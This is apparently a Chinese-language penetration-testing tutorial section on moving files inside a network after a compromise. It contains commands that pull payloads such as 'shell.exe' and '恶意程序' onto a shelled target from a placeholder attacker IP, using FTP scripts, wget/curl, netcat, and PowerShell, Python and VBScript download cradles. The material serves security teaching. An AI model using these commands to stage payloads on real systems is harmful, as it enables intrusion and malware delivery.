## Windows系统下的内网文件传输

上一节我们介绍了课程概述，本节中我们来看看在Windows系统下如何进行内网文件传输。以下是几种常见的方法：

### 1. 使用FTP协议传输文件

FTP（文件传输协议）是用于在网络上进行文件传输的标准协议。在Windows系统中，通常自带FTP客户端。

**核心概念**：FTP是一个客户端-服务器协议，用于在两台计算机之间传输文件。其基本命令格式如下：
```bash
ftp [主机名或IP地址]
```

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_5.png)

**操作流程**：
1.  在攻击机（Kali Linux）上使用Python快速搭建一个FTP服务器。
2.  在目标机（Windows）上通过脚本或命令连接该FTP服务器并下载文件。

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_6.png)

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_8.png)

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_9.png)

**具体步骤**：
*   **第一步：在攻击机开启FTP服务器**
    使用`pyftpdlib`库可以快速搭建。如果未安装，可使用`pip`安装。
    ```bash
    pip install pyftpdlib
    ```
    安装后，使用以下命令在指定目录启动FTP服务器（默认端口2121）：
    ```bash
    python3 -m pyftpdlib -p 2121
    ```
*   **第二步：在目标机编写并执行FTP下载脚本**
    在已获得Shell的目标Windows机器上，可以通过`copy con`命令创建脚本文件。
    ```cmd
    copy con ftp.txt
    open 192.168.1.100 2121
    anonymous

    get shell.exe
    quit
    ^Z
    ```
    脚本解释：
    *   `open [IP] [端口]`：连接FTP服务器。
    *   `anonymous`：使用匿名用户登录（密码可为空或任意）。
    *   `get [文件名]`：从服务器下载指定文件。
    *   `quit`：退出FTP会话。
    *   `^Z`：按`Ctrl+Z`然后回车，保存文件。
    最后，使用`ftp`命令配合`-s`参数执行该脚本，自动完成下载：
    ```cmd
    ftp -s:ftp.txt
    ```

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_10.png)

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_12.png)

**安全风险提示**：FTP协议本身不加密，且若配置不当（如允许匿名登录、目录权限过大），攻击者可能通过爆破或直接连接上传恶意文件，从而控制服务器。

## Linux系统下的内网文件传输

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_19.png)

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_21.png)

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_23.png)

了解了Windows下的方法后，本节我们来看看在Linux系统下如何传输文件。Linux系统提供了更多原生工具。

以下是几种在Linux中常用的文件传输方法：

*   **使用`wget`或`curl`命令**：这两个命令可以直接从HTTP/HTTPS或FTP服务器下载文件，非常方便。
    ```bash
    wget http://攻击机IP/恶意程序
    curl -O http://攻击机IP/恶意程序
    ```
*   **使用`scp`命令**：如果目标机与攻击机之间配置了SSH密钥信任，可以使用`scp`进行加密传输。
    ```bash
    scp user@攻击机IP:/文件路径 /目标机本地路径
    ```
*   **使用`nc`（Netcat）**：这是一个强大的网络工具，可以创建简单的文件传输通道。
    *   在接收方（目标机）监听端口并接收文件：
        ```bash
        nc -lvp 4444 > received_file
        ```
    *   在发送方（攻击机）向该端口发送文件：
        ```bash
        nc 目标机IP 4444 < 要发送的文件
        ```
*   **使用Python/Ruby等脚本语言**：如果目标系统安装了Python，可以直接使用单行命令开启HTTP服务器供下载。
    ```bash
    python3 -m http.server 8000
    ```
    然后目标机即可通过`wget`或`curl`从`http://攻击机IP:8000/文件名`下载。

## 使用脚本语言进行文件下载

以下是利用脚本下载文件的思路：

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_39.png)

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_41.png)

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_43.png)

![](img/09cceb2cb0d5e8405c0250fe873e2d8c_44.png)

*   **Windows PowerShell**：PowerShell是Windows自带的强大脚本工具，可以方便地下载文件。
    ```powershell
    Invoke-WebRequest -Uri "http://攻击机IP/文件" -OutFile "C:\本地路径\文件名"
    # 或使用别名
    wget "http://攻击机IP/文件" -OutFile "文件名"
    ```
*   **Linux/Windows Python**：如果目标机安装了Python，可以使用其`urllib`或`requests`库（如果存在）进行下载。
    ```python
    # Python单行命令示例
    python3 -c "import urllib.request; urllib.request.urlretrieve('http://攻击机IP/文件', '本地文件名')"
    ```
*   **VBScript (Windows)**：在一些老旧的Windows系统上，VBScript可能是一个备选方案。
    ```vbscript
    Set xPost = CreateObject("Microsoft.XMLHTTP")
    xPost.Open "GET", "http://攻击机IP/文件", 0
    xPost.Send()
    Set sGet = CreateObject("ADODB.Stream")
    sGet.Mode = 3
    sGet.Type = 1
    sGet.Open()
    sGet.Write(xPost.responseBody)
    sGet.SaveToFile "C:\本地路径\文件", 2
    ```
